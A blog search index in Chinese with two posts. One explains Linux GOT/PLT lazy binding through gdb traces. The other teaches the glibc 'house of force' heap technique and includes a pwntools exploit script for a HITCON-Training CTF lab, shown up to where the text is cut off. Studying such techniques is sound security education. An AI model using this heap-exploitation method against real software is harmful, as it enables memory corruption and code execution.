<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Linux 延迟绑定机制]]></title>
      <url>/Linux%20%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/</url>
      <content type="html"><![CDATA[<p>如果使用动态链接方式生成的程序模块中使用大量的函数引用，在程序执行时会花费大量的时间用于模块间函数引用的符号查找和重定位，导致程序性能下降。由于程序中可能存在部分不常用的功能模块，那么在程序开始执行时就完成所有函数的链接工作将会是一种浪费。因此，Linux 系统采用延迟绑定机制优化动态链接程序的符号重定位过程。</p>
<h3 id="0x01-延迟绑定原理"><a href="#0x01-延迟绑定原理" class="headerlink" title="0x01 延迟绑定原理"></a><strong>0x01 延迟绑定原理</strong></h3><p>延迟绑定是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数不被调用就不进行绑定。延迟绑定机制可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。</p>
<blockquote>
<p>GOT（Global Offset Table，全局偏移表）<br>GOT 是数据段用于地址无关代码的 Linux ELF 文件中确定全局变量和外部函数地址的表。ELF 中有 .got 和 .plt.got 两个 GOT 表，.got 表用于全局变量的引用地址，.got.plt 用于保存函数引用的地址。  </p>
<p>PLT（Procedure Linkage Table，程序链接表）<br>PLT 是 Linux ELF 文件中用于延迟绑定的表。</p>
</blockquote>
<p>下面介绍延迟绑定的基本原理。假设程序中调用 func 函数，该函数在 .plt 段中相应的项为 func@plt，在 .got.plt 中相应的项为 func@got，链接器在初始化时将 func@got 中的值填充为 “preapre resolver” 指令处的地址。func@plt 的伪代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">func@plt:</div><div class="line">jmp *(func@got)</div><div class="line">prepare resolver</div><div class="line">jmp _dl_runtime_resolve</div></pre></td></tr></table></figure></p>
<h4 id="1-首次调用"><a href="#1-首次调用" class="headerlink" title="1. 首次调用"></a><strong>1. 首次调用</strong></h4><p>第一次调用 func 函数时，首先会跳转到 PLT 执行 <code>jmp *(func@got)</code>，由于该函数没被调用过，func@got 中的值不是 func 函数的地址，而是 PLT 中的 “preapre resolver” 指令的地址，所以会跳转到 “preapre resolver” 执行，接着会调用 _dl_runtime_resolve 解析 func 函数的地址，并将该函数真正的地址填充到 func@got，最后跳转到 func 函数继续执行代码。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-29/78087498.jpg" alt="">    </p>
<h4 id="2-非首次调用"><a href="#2-非首次调用" class="headerlink" title="2. 非首次调用"></a><strong>2. 非首次调用</strong></h4><p>当再次调用 func 函数时，由于 func@got 中已填充正确的函数地址，此时执行 PLT 中的 <code>jmp *(func@got)</code> 即可成功跳转到 func 函数中执行。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-29/26402902.jpg" alt="">    </p>
<h3 id="0x02-实例调试"><a href="#0x02-实例调试" class="headerlink" title="0x02 实例调试"></a><strong>0x02 实例调试</strong></h3><p>下面通过调试程序中 func 函数的调用过程说明延迟绑定的原理。首先函数执行 call 指令调用 func 函数时会跳转到 0x8048420（func@plt）处执行。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   <span class="number">0x8048546</span> &lt;main+<span class="number">11</span>&gt;: mov    ebp,esp</div><div class="line">   <span class="number">0x8048548</span> &lt;main+<span class="number">13</span>&gt;: push   ecx</div><div class="line">   <span class="number">0x8048549</span> &lt;main+<span class="number">14</span>&gt;: sub    esp,<span class="number">0x4</span></div><div class="line">=&gt; <span class="number">0x804854c</span> &lt;main+<span class="number">17</span>&gt;: call   <span class="number">0x8048420</span> &lt;func@plt&gt;</div><div class="line">   <span class="number">0x8048551</span> &lt;main+<span class="number">22</span>&gt;: nop</div><div class="line">   <span class="number">0x8048552</span> &lt;main+<span class="number">23</span>&gt;: add    esp,<span class="number">0x4</span></div><div class="line">   <span class="number">0x8048555</span> &lt;main+<span class="number">26</span>&gt;: pop    ecx</div><div class="line">   <span class="number">0x8048556</span> &lt;main+<span class="number">27</span>&gt;: pop    ebp</div><div class="line">Guessed arguments:</div><div class="line">arg[<span class="number">0</span>]: <span class="number">0xf7fb33dc</span> --&gt; <span class="number">0xf7fb41e0</span> --&gt; <span class="number">0x0</span></div><div class="line">arg[<span class="number">1</span>]: <span class="number">0xffffced0</span> --&gt; <span class="number">0x1</span></div><div class="line">arg[<span class="number">2</span>]: <span class="number">0x0</span></div></pre></td></tr></table></figure></p>
<p>接着跳转到 ds[0x804a010]（func@got）处，由于是第一次调用该函数，func@got 中的地址并非函数的真实地址，需要对其进行地址重定位。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   <span class="number">0x8048410</span> &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:<span class="number">0x804a00c</span></div><div class="line">   <span class="number">0x8048416</span> &lt;__libc_start_main@plt+<span class="number">6</span>&gt;: push   <span class="number">0x0</span></div><div class="line">   <span class="number">0x804841b</span> &lt;__libc_start_main@plt+<span class="number">11</span>&gt;:        jmp    <span class="number">0x8048400</span></div><div class="line">=&gt; <span class="number">0x8048420</span> &lt;func@plt&gt;:        jmp    DWORD PTR ds:<span class="number">0x804a010</span></div><div class="line"> | <span class="number">0x8048426</span> &lt;func@plt+<span class="number">6</span>&gt;:      push   <span class="number">0x8</span></div><div class="line"> | <span class="number">0x804842b</span> &lt;func@plt+<span class="number">11</span>&gt;:     jmp    <span class="number">0x8048400</span></div><div class="line"> | <span class="number">0x8048430</span>:   jmp    DWORD PTR ds:<span class="number">0x8049ffc</span></div><div class="line"> | <span class="number">0x8048436</span>:   xchg   ax,ax</div><div class="line"> |-&gt;   <span class="number">0x8048426</span> &lt;func@plt+<span class="number">6</span>&gt;:  push   <span class="number">0x8</span></div><div class="line">       <span class="number">0x804842b</span> &lt;func@plt+<span class="number">11</span>&gt;: jmp    <span class="number">0x8048400</span></div><div class="line">       <span class="number">0x8048430</span>:       jmp    DWORD PTR ds:<span class="number">0x8049ffc</span></div><div class="line">       <span class="number">0x8048436</span>:       xchg   ax,ax</div><div class="line">                                                                  JUMP is taken</div></pre></td></tr></table></figure></p>
<p>0x804a010 是 func 函数的重定位偏移，即重定位表中 func 函数的重定位入口。此时 0x804a010（func@got）中的地址为 0x8048426，即 PLT 中准备进行地址解析的指令地址。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">readelf -r test_lib1</div><div class="line"></div><div class="line">Relocation section '.rel.plt' at offset 0x3c0 contains 2 entries:</div><div class="line"> Offset     Info    Type            Sym.Value  Sym. Name</div><div class="line">0804a00c  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</div><div class="line">0804a010  00000407 R_386_JUMP_SLOT   00000000   func</div><div class="line"></div><div class="line">gdb-peda$ telescope 0x804a010</div><div class="line">0000| 0x804a010 --&gt; 0x8048426 (&lt;func@plt+6&gt;:    push   0x8)</div><div class="line">0004| 0x804a014 --&gt; 0x0</div><div class="line">0008| 0x804a018 --&gt; 0x0</div></pre></td></tr></table></figure></p>
<p>程序跳转到 0x8048426 后，又经过 2 次跳转到 ds[0x804a008] 处执行。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   <span class="number">0x804841b</span> &lt;__libc_start_main@plt+<span class="number">11</span>&gt;:        jmp    <span class="number">0x8048400</span></div><div class="line">   <span class="number">0x8048420</span> &lt;func@plt&gt;:        jmp    DWORD PTR ds:<span class="number">0x804a010</span></div><div class="line">   <span class="number">0x8048426</span> &lt;func@plt+<span class="number">6</span>&gt;:      push   <span class="number">0x8</span></div><div class="line">=&gt; <span class="number">0x804842b</span> &lt;func@plt+<span class="number">11</span>&gt;:     jmp    <span class="number">0x8048400</span></div><div class="line"> | <span class="number">0x8048430</span>:   jmp    DWORD PTR ds:<span class="number">0x8049ffc</span></div><div class="line"> | <span class="number">0x8048436</span>:   xchg   ax,ax</div><div class="line"> | <span class="number">0x8048438</span>:   add    BYTE PTR [eax],al</div><div class="line"> | <span class="number">0x804843a</span>:   add    BYTE PTR [eax],al</div><div class="line"> |-&gt;   <span class="number">0x8048400</span>:       push   DWORD PTR ds:<span class="number">0x804a004</span></div><div class="line">       <span class="number">0x8048406</span>:       jmp    DWORD PTR ds:<span class="number">0x804a008</span></div><div class="line">       <span class="number">0x804840c</span>:       add    BYTE PTR [eax],al</div><div class="line">       <span class="number">0x804840e</span>:       add    BYTE PTR [eax],al</div><div class="line">                                                                  JUMP is taken</div></pre></td></tr></table></figure></p>
<p>ds[0x804a008] 处即为用于解析 func 地址的 _dl_runtime_resolve 函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   <span class="number">0x80483fd</span>:   add    BYTE PTR [eax],al</div><div class="line">   <span class="number">0x80483ff</span>:   add    bh,bh</div><div class="line">   <span class="number">0x8048401</span>:   xor    eax,<span class="number">0x804a004</span></div><div class="line">=&gt; <span class="number">0x8048406</span>:   jmp    DWORD PTR ds:<span class="number">0x804a008</span></div><div class="line"> | <span class="number">0x804840c</span>:   add    BYTE PTR [eax],al</div><div class="line"> | <span class="number">0x804840e</span>:   add    BYTE PTR [eax],al</div><div class="line"> | <span class="number">0x8048410</span> &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:<span class="number">0x804a00c</span></div><div class="line"> | <span class="number">0x8048416</span> &lt;__libc_start_main@plt+<span class="number">6</span>&gt;: push   <span class="number">0x0</span></div><div class="line"> |-&gt;   <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;:        push   eax</div><div class="line">       <span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;:      push   ecx</div><div class="line">       <span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;:      push   edx</div><div class="line">       <span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;:      mov    edx,DWORD PTR [esp+<span class="number">0x10</span>]</div><div class="line">                                                                  JUMP is taken</div></pre></td></tr></table></figure></p>
<p>_dl_runtime_resolve 函数会将 func 函数的真实地址填充到 0x804a010（func@got）中，并返回到 func 函数中继续执行。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   <span class="number">0xf7fd051c</span> &lt;__x86.get_pc_thunk.dx&gt;:  mov    edx,DWORD PTR [esp]</div><div class="line">   <span class="number">0xf7fd051f</span> &lt;__x86.get_pc_thunk.dx+<span class="number">3</span>&gt;:        ret    </div><div class="line">   <span class="number">0xf7fd0520</span> &lt;func&gt;:   push   ebp</div><div class="line">=&gt; <span class="number">0xf7fd0521</span> &lt;func+<span class="number">1</span>&gt;: mov    ebp,esp</div><div class="line">   <span class="number">0xf7fd0523</span> &lt;func+<span class="number">3</span>&gt;: push   ebx</div><div class="line">   <span class="number">0xf7fd0524</span> &lt;func+<span class="number">4</span>&gt;: sub    esp,<span class="number">0x4</span></div><div class="line">   <span class="number">0xf7fd0527</span> &lt;func+<span class="number">7</span>&gt;: call   <span class="number">0xf7fd054b</span> &lt;__x86.get_pc_thunk.ax&gt;</div><div class="line">   <span class="number">0xf7fd052c</span> &lt;func+<span class="number">12</span>&gt;:        add    eax,<span class="number">0x1ad4</span></div><div class="line"></div><div class="line">gdb-peda$ telescope <span class="number">0x804a010</span></div><div class="line"><span class="number">0000</span>| <span class="number">0x804a010</span> --&gt; <span class="number">0xf7fd0520</span> (&lt;func&gt;: push   ebp)</div></pre></td></tr></table></figure></p>
<p>至此，使用延迟绑定的可执行文件中函数地址重定位已完成，当再次调用 func 函数时即可通过 jmp ds[0x804a010] 直接跳转到 func 函数中执行。</p>
<hr>
<p>References:<br>[1]《程序员的自我修养》<br>[2] <a href="http://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/" target="_blank" rel="external">通过 GDB 调试理解 GOT/PLT</a><br>[3] <a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="external">手把手教你栈溢出从入门到放弃（下）</a></p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PLT </tag>
            
            <tag> Lazy Binding </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux glibc heap house-of-force]]></title>
      <url>/Linux%20glibc%20heap%20house-of-force/</url>
      <content type="html"><![CDATA[<p>该利用方法通过堆溢出漏洞修改 top chunk 的 size 字段，使得 malloc 一块很大的内存可使用 top chunk 进行分配，当更新 top chunk 的 ptr 时会发生整数溢出，从而控制 top chunk ptr 为指定目标内存地址，如 .bss 段、.data 段和 GOT 表等。当再次使用 malloc 申请内存时将从目标内存处进行分配，之后对该内存进行写操作，即可实现任意地址写数据。</p>
<h3 id="0x01-TOP-Chunk"><a href="#0x01-TOP-Chunk" class="headerlink" title="0x01 TOP Chunk"></a><strong>0x01 TOP Chunk</strong></h3><p>堆内存是从低地址向高地址进行分配的，在堆内存的最高处存在着一块空闲 chunk 称为 top chunk。使用 malloc 分配内存时，若 bins 和 fast bins 中的 chunk 都不能满足分配需要则在 top chunk 中分出一块内存给用户。</p>
<p>top chunk 的大小跟随内存的分配和回收不停变换，如果从 top chunk 分配内存会导致 top chunk 减小，同时 top chunk 的指针增大；如果回收的 chunk 恰好与 top chunk 相邻，那么回收的 chunk 就会合并到 top chunk 中，从而使 top chunk 变大，top chunk 的指针减小。</p>
<p>glibc 中从 top chunk 分配内存的代码如下，首先会检查 top chunk 的大小是否能满足分配需求，同时还要确保分配完后剩余的大小不能小于最小 chunk 大小（MINSIZE），若满足该条件则进行分配。分配内存后需更新 top chunk 的 size 字段为 size - nb（nb 为新分配 chunk 的大小），top chunk ptr 更新为 ptr + nb。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* malloc.c in glibc-2.23 */</span></div><div class="line"><span class="comment">/* finally, do the allocation */</span></div><div class="line">  p = av-&gt;top;</div><div class="line">  size = chunksize (p);</div><div class="line"></div><div class="line"><span class="comment">/* check that one of the above allocation paths succeeded */</span></div><div class="line"><span class="comment">/* 若top chunk分割后，剩余的大小仍不小于最小chunk大小（MINSIZE），则进行分配。*/</span></div><div class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</div><div class="line">  &#123;</div><div class="line">      remainder_size = size - nb;   <span class="comment">// 更新top chunk的size</span></div><div class="line">      remainder = chunk_at_offset (p, nb);   <span class="comment">// 更新top chunk的ptr</span></div><div class="line">      av-&gt;top = remainder;</div><div class="line">      set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</div><div class="line">      set_head (remainder, remainder_size | PREV_INUSE);</div><div class="line">      check_malloced_chunk (av, p, nb);</div><div class="line">      <span class="keyword">return</span> chunk2mem (p);   <span class="comment">// 返回新分配的内存地址</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></div><div class="line"></div><div class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></div></pre></td></tr></table></figure></p>
<p>下面以一个例子说明该过程，堆内存初始状态如下，top chunk 的大小为 0x20fe0，ptr为 0x603020，并且 bins 中没有空闲的 chunk。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  <span class="number">0x603000</span></div><div class="line">chunk      <span class="number">0x603000</span>         <span class="number">0x20</span>            (inuse)</div><div class="line">chunk      <span class="number">0x603020</span>         <span class="number">0x20fe0</span>         (top)</div><div class="line">sbrk_end   <span class="number">0x624000</span></div></pre></td></tr></table></figure></p>
<p>此时使用 malloc(0x45) 申请一个新 chunk，将会在 top chunk 中分配内存给该 chunk。新分配 chunk ptr 为 0x603020，即原 top chunk 的 ptr，大小为 0x50 = align(0x45 + 0x8)，其中 0x8 为 size 字段长度，对齐单位为 16 字节（32 bit 系统中为 8 字节）；分配完后，top chunk 的 size 为 0x20f90 = 0x20fe0-0x50，ptr 为 0x603070 = 0x603020+0x50；最后返回给用户的内存为 0x603030 = 0x603020+2*0x8。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  <span class="number">0x603000</span></div><div class="line">chunk      <span class="number">0x603000</span>         <span class="number">0x20</span>            (inuse)</div><div class="line">chunk      <span class="number">0x603020</span>         <span class="number">0x50</span>            (inuse)</div><div class="line">chunk      <span class="number">0x603070</span>         <span class="number">0x20f90</span>         (top)</div><div class="line">sbrk_end   <span class="number">0x624000</span></div><div class="line">gdb-peda$ info reg rax</div><div class="line">rax            <span class="number">0x603030</span> <span class="number">0x603030</span></div></pre></td></tr></table></figure></p>
<h3 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a><strong>0x02 利用方法</strong></h3><p>在 top chunk 中分配一块很大的内存给新申请的 chunk，使得更新 top chunk 的 ptr 时发生整数溢出，从而控制 top chunk ptr 为指定目标内存地址，如 .bss 段、.data 段和 GOT 表等。当再次使用 malloc 申请内存时将返回目标内存地址，之后对该内存进行写操作，即可实现任意地址写数据。    </p>
<h4 id="1-修改-top-chunk-的-size-为大数"><a href="#1-修改-top-chunk-的-size-为大数" class="headerlink" title="1. 修改 top chunk 的 size 为大数"></a><strong>1. 修改 top chunk 的 size 为大数</strong></h4><p>从上面的分析可知，在 top chunk 中分配内存需要满足以下条件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)</div></pre></td></tr></table></figure></p>
<p>由于 arena 的大小为 132KB，所以 top chunk 的 size 不大于 132KB（0x21000 bytes），因此在正常情况下通过 top chunk 分配的堆不能超过 0x21000 bytes，这导致无法在更新 top chunk 的 ptr 时发生整数溢出。为此，需要先利用堆溢出漏洞修改 top chunk 的 size 为一个大数，通常取 -1（其补码为 0xFFFFFFFFFFFFFFFF），之后便可通过 top chunk 申请一块很大的内存以触发整数溢出。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-19/51587433.jpg" alt="">     </p>
<h4 id="2-malloc-一块大内存，控制-top-chunk-ptr"><a href="#2-malloc-一块大内存，控制-top-chunk-ptr" class="headerlink" title="2. malloc 一块大内存，控制 top chunk ptr"></a><strong>2. malloc 一块大内存，控制 top chunk ptr</strong></h4><p>假设该步骤中申请内存时用户请求大小为 request_size；最终需控制的内存地址为 target；top chunk 的 ptr 初始值为 top_old，分配新 chunk 后的 ptr 为 top_new；由上一节中的分析可得到以下等式，其中 SIZE_SZ 在 64 bits 系统中为 8 bytes，32 bits 系统中为 4 bytes。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">top_new = top_old + align(request_size+ SIZE_SZ)  <span class="comment">// SIZE_SZ为size字段长度</span></div><div class="line">target = top_new + <span class="number">2</span>* SIZE_SZ  <span class="comment">// 2* SIZE_SZ为prev_size和size字段长度</span></div></pre></td></tr></table></figure></p>
<p>根据上式可得<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">request_size  = target - top_old - <span class="number">2</span>*SIZE_SZ - SIZE_SZ</div></pre></td></tr></table></figure></p>
<p> 需要注意的是 request_size+SIZE_SZ 要遵循块的对齐机制，如果未对齐应进行调整，将 request_size 的计算结果减去一个值（因为对齐时会增大长度使其对齐），使 request_size+SIZE_SZ 能对齐。</p>
<p>malloc 执行完后 top chunk ptr 将会更新，并指向目标内存 target-2* SIZE_SZ 处，即 top chunk 已转移到目标内存地址。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-19/65486405.jpg" alt="">    </p>
<p><strong>由于计算 request_size 的大小需要知道堆内存中 top_old 的 ptr，所以得借助其他漏洞泄漏堆中 top chunk 的地址。或者可以将 target 指定在堆内存区域，那么通过本地调试可获得 top chunk 的地址，此时使用上式计算所得 request_size 相当于相对地址偏移，当堆基址改变后该值仍适用。</strong></p>
<h4 id="3-再次-malloc，返回目标内存"><a href="#3-再次-malloc，返回目标内存" class="headerlink" title="3. 再次 malloc，返回目标内存"></a><strong>3. 再次 malloc，返回目标内存</strong></h4><p>此时申请 chunk 将从目标内存处分配，最终成功返回目标内存 target，之后可对该内存写数据，以实现进一步的攻击。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-19/46291433.jpg" alt="">    </p>
<h3 id="0x03-实例分析"><a href="#0x03-实例分析" class="headerlink" title="0x03 实例分析"></a><strong>0x03 实例分析</strong></h3><p>下面以 <a href="https://github.com/scwuaptx/HITCON-Training" target="_blank" rel="external">HITCON-Training</a> 中的 lab11 为例说明 house of force 的利用过程，题目文件和利用脚本也可在 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/heap_house-of-force" target="_blank" rel="external">Github</a> 中下载。</p>
<h4 id="1-漏洞"><a href="#1-漏洞" class="headerlink" title="1. 漏洞"></a><strong>1. 漏洞</strong></h4><p>程序中在修改 item 时调用 change_item() 函数，name 的长度由用户指定，并且没有进行检查。输入过长字符串到 name 中将会导致堆溢出，可覆盖 top chunk。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">void change_item()&#123;</div><div class="line">    ...</div><div class="line">    if(itemlist[index].name)&#123;</div><div class="line">        printf("Please enter the length of item name:");</div><div class="line">        read(0,lengthbuf,8);</div><div class="line">        length = atoi(lengthbuf);</div><div class="line">        printf("Please enter the new name of the item:");</div><div class="line">        readsize = read(0,itemlist[index].name,length);   // overflow</div><div class="line">        *(itemlist[index].name + readsize) = '\x00';</div><div class="line">    &#125;</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<h4 id="2-利用脚本"><a href="#2-利用脚本" class="headerlink" title="2. 利用脚本"></a><strong>2. 利用脚本</strong></h4><h5 id="1）利用思路"><a href="#1）利用思路" class="headerlink" title="1）利用思路"></a><strong>1）利用思路</strong></h5><p>利用 house of force 使得 top chunk 转移到 box 结构体所在内存处，使得下次申请内存时从该地址开始进行分配，控制该内存块后可修改 box 结构体中的函数指针为 magic 函数地址；最后调用 goobye_message 函数时就跳转到 magic 函数执行，从而输出 flag。</p>
<h5 id="2）利用脚本"><a href="#2）利用脚本" class="headerlink" title="2）利用脚本"></a><strong>2）利用脚本</strong></h5><p>利用脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">r = process(<span class="string">'./bamboobox'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">additem</span><span class="params">(length,name)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"2"</span>)</div><div class="line">    r.recvuntil(<span class="string">"name:"</span>)</div><div class="line">    r.sendline(str(length))</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(name)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx,length,name)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"3"</span>)</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(length))</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(name)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"4"</span>)</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"1"</span>)</div><div class="line"></div><div class="line"></div><div class="line">magic = <span class="number">0x400d49</span></div><div class="line">raw_input(<span class="string">"malloc item0"</span>)</div><div class="line">additem(<span class="number">0x40</span>,<span class="string">"AAAA"</span>)</div><div class="line"></div><div class="line"><span class="comment">#raw_input("modify item0,overite size of top chunk")</span></div><div class="line">modify(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">"a"</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>))</div><div class="line"></div><div class="line"><span class="comment">#raw_input("add a large chunk,control top chunk")</span></div><div class="line">additem(<span class="number">0x603010</span> - <span class="number">0x603070</span> - <span class="number">2</span>*<span class="number">8</span> - <span class="number">8</span>,<span class="string">"BBBB"</span>)</div><div class="line"></div><div class="line"><span class="comment">#raw_input("return target,overwrite function ptr")</span></div><div class="line">additem(<span class="number">0x20</span>,p64(magic)*<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment">#raw_input("exit")</span></div><div class="line">r.sendline(<span class="string">'5'</span>)</div><div 